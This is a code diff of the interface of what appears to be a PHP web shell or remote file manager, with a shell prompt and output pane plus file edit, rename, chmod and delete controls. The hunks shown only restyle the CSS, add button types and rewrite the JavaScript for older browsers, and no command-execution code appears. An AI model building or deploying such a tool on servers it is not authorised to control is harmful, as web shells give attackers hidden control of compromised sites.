@@ -177,31 +177,32 @@ $user   = function_exists('get_current_user') ? get_current_user() : '?';
 <style>
 :root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--bd:#30363d;--tx:#e6edf3;--tx2:#8b949e;--ac:#58a6ff;--gr:#3fb950;--ye:#d29922;--re:#f85149}
 *{box-sizing:border-box;margin:0;padding:0}
-html,body{height:100%;background:var(--bg);color:var(--tx);font-family:'Consolas','Courier New',monospace;font-size:13px;line-height:1.5}
+html,body{height:100%;background:var(--bg);color:var(--tx);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;line-height:1.6}
 a{color:var(--ac);text-decoration:none}
 a:hover{text-decoration:underline}
+code,.mono{font-family:'Consolas','Courier New',monospace}
 
 /* layout */
-.topbar{background:var(--bg2);border-bottom:1px solid var(--bd);padding:8px 14px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.topbar{background:var(--bg2);border-bottom:1px solid var(--bd);padding:9px 16px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
 .topbar .logo{font-weight:700;color:var(--tx);font-size:14px;letter-spacing:.5px}
-.topbar .info{color:var(--tx2);font-size:11px}
-.topbar .info b{color:var(--ac)}
-.wrap{display:flex;height:calc(100vh - 41px)}
-.sidebar{width:200px;min-width:160px;background:var(--bg2);border-right:1px solid var(--bd);display:flex;flex-direction:column;overflow:hidden}
-.sidebar .nav-item{padding:8px 14px;cursor:pointer;color:var(--tx2);display:flex;align-items:center;gap:8px;border-left:2px solid transparent;font-size:12px}
+.topbar .info{color:var(--tx2);font-size:12px}
+.topbar .info b{color:var(--ac);font-family:'Consolas','Courier New',monospace;font-size:12px}
+.wrap{display:flex;height:calc(100vh - 43px)}
+.sidebar{width:190px;min-width:150px;background:var(--bg2);border-right:1px solid var(--bd);display:flex;flex-direction:column;overflow:hidden}
+.sidebar .nav-item{padding:9px 16px;cursor:pointer;color:var(--tx2);display:flex;align-items:center;gap:9px;border-left:2px solid transparent;font-size:13px}
 .sidebar .nav-item:hover{background:var(--bg3);color:var(--tx)}
 .sidebar .nav-item.active{background:var(--bg3);color:var(--tx);border-left-color:var(--ac)}
 .sidebar .nav-item svg{flex-shrink:0}
-.main{flex:1;overflow-y:auto;padding:14px}
+.main{flex:1;overflow-y:auto;padding:16px}
 
 /* breadcrumb */
-.breadcrumb{display:flex;align-items:center;gap:4px;flex-wrap:wrap;margin-bottom:10px;font-size:12px;color:var(--tx2)}
+.breadcrumb{display:flex;align-items:center;gap:4px;flex-wrap:wrap;margin-bottom:12px;font-size:12px;color:var(--tx2);font-family:'Consolas','Courier New',monospace}
 .breadcrumb a{color:var(--ac)}
 .breadcrumb span{color:var(--tx2)}
 
 /* toolbar */
 .toolbar{display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap;align-items:center}
-.btn{background:var(--bg3);border:1px solid var(--bd);color:var(--tx);padding:4px 10px;cursor:pointer;font:12px monospace;border-radius:4px;display:inline-flex;align-items:center;gap:5px}
+.btn{background:var(--bg3);border:1px solid var(--bd);color:var(--tx);padding:5px 12px;cursor:pointer;font:13px -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;border-radius:5px;display:inline-flex;align-items:center;gap:5px}
 .btn:hover{border-color:var(--ac);color:var(--ac)}
 .btn.danger:hover{border-color:var(--re);color:var(--re)}
 .btn.primary{background:#1f4a8a;border-color:var(--ac);color:var(--ac)}
@@ -209,28 +210,28 @@ a:hover{text-decoration:underline}
 
 /* file table */
 .ftable{width:100%;border-collapse:collapse}
-.ftable th{padding:5px 8px;text-align:left;color:var(--tx2);font-size:11px;border-bottom:1px solid var(--bd);font-weight:normal}
-.ftable td{padding:5px 8px;border-bottom:1px solid var(--bd);vertical-align:middle}
+.ftable th{padding:6px 10px;text-align:left;color:var(--tx2);font-size:12px;border-bottom:1px solid var(--bd);font-weight:600;text-transform:uppercase;letter-spacing:.4px}
+.ftable td{padding:6px 10px;border-bottom:1px solid var(--bd);vertical-align:middle}
 .ftable tr:hover td{background:var(--bg2)}
 .fname{display:flex;align-items:center;gap:6px}
-.fname a{color:var(--tx)}
+.fname a{color:var(--tx);font-size:13px}
 .fname a:hover{color:var(--ac)}
 .factions{display:flex;gap:4px}
-.factions .btn{padding:2px 7px;font-size:11px}
-.ftable .col-perm{color:var(--tx2);font-size:11px}
-.ftable .col-size{color:var(--tx2);font-size:11px;white-space:nowrap}
-.ftable .col-date{color:var(--tx2);font-size:11px;white-space:nowrap}
+.factions .btn{padding:3px 8px;font-size:12px}
+.ftable .col-perm{color:var(--tx2);font-size:12px;font-family:'Consolas','Courier New',monospace}
+.ftable .col-size{color:var(--tx2);font-size:12px;white-space:nowrap}
+.ftable .col-date{color:var(--tx2);font-size:12px;white-space:nowrap}
 
 /* input */
-input[type=text],textarea,select{background:var(--bg3);border:1px solid var(--bd);color:var(--tx);font:13px monospace;padding:5px 8px;outline:none;border-radius:4px}
+input[type=text],textarea,select{background:var(--bg3);border:1px solid var(--bd);color:var(--tx);font:13px/1.5 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:6px 10px;outline:none;border-radius:5px}
 input[type=text]:focus,textarea:focus{border-color:var(--ac)}
-input[type=file]{color:var(--tx2);font-size:12px}
+input[type=file]{color:var(--tx2);font-size:13px}
 
 /* shell */
-.shell-out{background:var(--bg2);border:1px solid var(--bd);padding:10px;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow-y:auto;font-size:12px;border-radius:4px;margin-top:8px}
-.shell-prompt{display:flex;gap:6px;align-items:center}
-.shell-prompt span{color:var(--gr);white-space:nowrap;font-size:12px}
-.shell-prompt input{flex:1}
+.shell-out{background:var(--bg2);border:1px solid var(--bd);padding:12px;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow-y:auto;font:13px/1.6 'Consolas','Courier New',monospace;border-radius:5px;margin-top:10px}
+.shell-prompt{display:flex;gap:8px;align-items:center}
+.shell-prompt span{color:var(--gr);white-space:nowrap;font:12px 'Consolas','Courier New',monospace}
+.shell-prompt input{flex:1;font-family:'Consolas','Courier New',monospace !important}
 
 /* editor */
 .editor-bar{display:flex;gap:6px;margin-bottom:8px;align-items:center}
@@ -238,8 +239,7 @@ input[type=file]{color:var(--tx2);font-size:12px}
 textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12px;line-height:1.6;background:var(--bg2);border-color:var(--bd);border-radius:4px}
 
 /* modal */
-.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:100;align-items:center;justify-content:center}
-.modal-bg.open{display:flex}
+.modal-bg{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.6);z-index:100;align-items:center;justify-content:center}
 .modal{background:var(--bg2);border:1px solid var(--bd);padding:18px;min-width:300px;border-radius:6px}
 .modal h3{margin-bottom:12px;font-size:13px;color:var(--tx)}
 .modal .row{margin-bottom:8px}
@@ -326,10 +326,10 @@ textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12
       <!-- toolbar -->
       <div class="toolbar">
         <?php if ($parent !== $cwd): ?>
-        <button class="btn" onclick="navTo(<?php echo sh_esc($parent);?>)">&#8593; Up</button>
+        <button type="button" class="btn" onclick="navTo(<?php echo sh_esc($parent);?>)">&#8593; Up</button>
         <?php endif; ?>
-        <button class="btn" onclick="openModal('modal-mkdir')">+ Folder</button>
-        <button class="btn" onclick="openModal('modal-newfile')">+ File</button>
+        <button type="button" class="btn" onclick="openModal('modal-mkdir')">+ Folder</button>
+        <button type="button" class="btn" onclick="openModal('modal-newfile')">+ File</button>
       </div>
 
       <!-- file table -->
@@ -366,11 +366,11 @@ textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12
           <td>
             <div class="factions">
               <?php if (!$isdir): ?>
-              <button class="btn" onclick="editFile(<?php echo sh_esc($fp);?>)">Edit</button>
+              <button type="button" class="btn" onclick="editFile(<?php echo sh_esc($fp);?>)">Edit</button>
               <?php endif; ?>
-              <button class="btn" onclick="openRename(<?php echo sh_esc($fp);?>,<?php echo sh_esc($name);?>)">Ren</button>
-              <button class="btn" onclick="openChmod(<?php echo sh_esc($fp);?>,<?php echo sh_esc($perms);?>)">Perm</button>
-              <button class="btn danger" onclick="doDelete(<?php echo sh_esc($fp);?>,<?php echo sh_esc($name);?>)">Del</button>
+              <button type="button" class="btn" onclick="openRename(<?php echo sh_esc($fp);?>,<?php echo sh_esc($name);?>)">Ren</button>
+              <button type="button" class="btn" onclick="openChmod(<?php echo sh_esc($fp);?>,<?php echo sh_esc($perms);?>)">Perm</button>
+              <button type="button" class="btn danger" onclick="doDelete(<?php echo sh_esc($fp);?>,<?php echo sh_esc($name);?>)">Del</button>
             </div>
           </td>
         </tr>
@@ -427,7 +427,7 @@ textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12
         <div class="editor-bar">
           <span class="epath"><?php echo sh_safe($edit_path);?></span>
           <button class="btn primary" type="submit">Save</button>
-          <button class="btn" type="button" onclick="setTab('browse')">&#x2715; Close</button>
+          <button type="button" class="btn" onclick="setTab('browse')">&#x2715; Close</button>
         </div>
         <textarea class="code" name="econtent"><?php echo sh_safe($edit_content);?></textarea>
       </form>
@@ -448,7 +448,7 @@ textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12
       <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
       <input type="hidden" name="action" value="mkdir">
       <div class="row"><label>Folder name</label><input type="text" name="newdir" autofocus></div>
-      <div class="btns"><button class="btn" type="button" onclick="closeModal('modal-mkdir')">Cancel</button><button class="btn primary" type="submit">Create</button></div>
+      <div class="btns"><button type="button" class="btn" onclick="closeModal('modal-mkdir')">Cancel</button><button class="btn primary" type="submit">Create</button></div>
     </form>
   </div>
 </div>
@@ -462,7 +462,7 @@ textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12
       <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
       <input type="hidden" name="action" value="newfile">
       <div class="row"><label>File name</label><input type="text" name="newfilename" autofocus></div>
-      <div class="btns"><button class="btn" type="button" onclick="closeModal('modal-newfile')">Cancel</button><button class="btn primary" type="submit">Create</button></div>
+      <div class="btns"><button type="button" class="btn" onclick="closeModal('modal-newfile')">Cancel</button><button class="btn primary" type="submit">Create</button></div>
     </form>
   </div>
 </div>
@@ -477,7 +477,7 @@ textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12
       <input type="hidden" name="action" value="rename">
       <input type="hidden" name="rpath"  id="rename_path">
       <div class="row"><label>New name</label><input type="text" name="rname" id="rename_name" autofocus></div>
-      <div class="btns"><button class="btn" type="button" onclick="closeModal('modal-rename')">Cancel</button><button class="btn primary" type="submit">Rename</button></div>
+      <div class="btns"><button type="button" class="btn" onclick="closeModal('modal-rename')">Cancel</button><button class="btn primary" type="submit">Rename</button></div>
     </form>
   </div>
 </div>
@@ -492,7 +492,7 @@ textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12
       <input type="hidden" name="action" value="chmod">
       <input type="hidden" name="chpath" id="chmod_path">
       <div class="row"><label>Octal (e.g. 0644)</label><input type="text" name="chmode" id="chmod_mode" maxlength="4"></div>
-      <div class="btns"><button class="btn" type="button" onclick="closeModal('modal-chmod')">Cancel</button><button class="btn primary" type="submit">Apply</button></div>
+      <div class="btns"><button type="button" class="btn" onclick="closeModal('modal-chmod')">Cancel</button><button class="btn primary" type="submit">Apply</button></div>
     </form>
   </div>
 </div>
@@ -520,22 +520,29 @@ textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12
 
 <script>
 function setTab(t){
-  document.querySelectorAll('.tabsec').forEach(function(s){s.style.display='none'});
-  document.querySelectorAll('.nav-item').forEach(function(s){s.classList.remove('active')});
+  var secs=document.getElementsByClassName('tabsec');
+  var navs=document.getElementsByClassName('nav-item');
+  var i;
+  for(i=0;i<secs.length;i++) secs[i].style.display='none';
+  for(i=0;i<navs.length;i++) navs[i].className=navs[i].className.replace(' active','');
   var sec=document.getElementById('tab-'+t);
-  if(sec) sec.style.display='';
-  document.querySelectorAll('.nav-item').forEach(function(el){
-    if(el.getAttribute('onclick')&&el.getAttribute('onclick').indexOf("'"+t+"'")>=0) el.classList.add('active');
-  });
+  if(sec) sec.style.display='block';
+  for(i=0;i<navs.length;i++){
+    var oc=navs[i].getAttribute('onclick')||'';
+    if(oc.indexOf("'"+t+"'")>=0) navs[i].className+=' active';
+  }
 }
 function navTo(p){document.getElementById('nav_cwd').value=p;document.getElementById('navform').submit();}
 function editFile(p){document.getElementById('edit_path').value=p;document.getElementById('editform').submit();}
-function openModal(id){document.getElementById(id).classList.add('open');}
-function closeModal(id){document.getElementById(id).classList.remove('open');}
-function openRename(path,name){document.getElementById('rename_path').value=path;document.getElementById('rename_name').value=name;openModal('modal-rename');}
+function openModal(id){document.getElementById(id).style.display='flex';}
+function closeModal(id){document.getElementById(id).style.display='none';}
+function openRename(path,name){
+  document.getElementById('rename_path').value=path;
+  document.getElementById('rename_name').value=name;
+  openModal('modal-rename');
+}
 function openChmod(path,perms){
   document.getElementById('chmod_path').value=path;
-  // convert rwx to octal
   var p=perms,o=0;
   if(p[1]==='r')o+=256;if(p[2]==='w')o+=128;if(p[3]==='x')o+=64;
   if(p[4]==='r')o+=32;if(p[5]==='w')o+=16;if(p[6]==='x')o+=8;
@@ -549,10 +556,10 @@ function doDelete(path,name){
     document.getElementById('delform').submit();
   }
 }
-// close modal on bg click
-document.querySelectorAll('.modal-bg').forEach(function(m){
-  m.addEventListener('click',function(e){if(e.target===m)m.classList.remove('open');});
-});
+var mbgs=document.getElementsByClassName('modal-bg');
+for(var mi=0;mi<mbgs.length;mi++){
+  mbgs[mi].onclick=function(e){if(e.target===this)this.style.display='none';};
+}
 </script>
 </body>
 </html>
